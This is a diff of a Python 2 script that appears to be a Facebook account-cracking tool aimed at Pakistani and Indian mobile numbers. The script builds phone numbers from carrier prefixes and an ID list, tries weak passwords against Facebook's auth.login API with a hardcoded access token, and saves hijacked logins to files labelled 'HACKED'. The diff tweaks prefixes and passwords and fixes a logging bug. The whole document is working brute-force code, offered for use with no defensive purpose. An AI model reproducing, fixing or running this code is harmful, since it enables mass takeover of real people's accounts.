@@ -97,7 +97,7 @@ def action():
                 os.system("clear")
                 print (logo)
                 print "\033[1;91mMOBILINK/JAZZ CODE HERE"
-                print "\033[1;95m536, 476, 832, 476, 537,"
+                print "\033[1;95m536, 759, 832, 476, 537,"
                 print "\033[1;95m05, 540, 736, 545, 242,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
@@ -117,7 +117,7 @@ def action():
                 print "\033[1;95m45, 64, ??, ??, ??,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+917"
+                        k="+918"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -133,7 +133,7 @@ def action():
                 print "\033[1;95m24, ??, ??, ??,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
-                        k="+918"
+                        k="+917"
                         idlist = ('.txt')
                         for line in open(idlist,"r").readlines():
                                 id.append(line.strip())
@@ -263,22 +263,22 @@ def action():
                                                                         cps.close()
                                                                         cpb.append(c+user+pass3)
                                                                 else:
-                                                                        pass4 = '953671'
+                                                                        pass4 = '953672'
                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
                                                                                 print '\x1b[1;91mMACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
                                                                                 okb = open('save/successfull.txt', 'a')
-                                                                                okb.write(k+c+user+'|'+pass3+'\n')
+                                                                                okb.write(k+c+user+'|'+pass4+'\n')
                                                                                 okb.close()
-                                                                                oks.append(c+user+pass3)
+                                                                                oks.append(c+user+pass4)
                                                                         else:
                                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
                                                                                         cps = open('save/checkpoint.txt', 'a')
-                                                                                        cps.write(k+c+user+'|'+pass3+'\n')
+                                                                                        cps.write(k+c+user+'|'+pass4+'\n')
                                                                                         cps.close()
-                                                                                        cpb.append(c+user+pass3)
+                                                                                        cpb.append(c+user+pass4)
 
    
                 except:
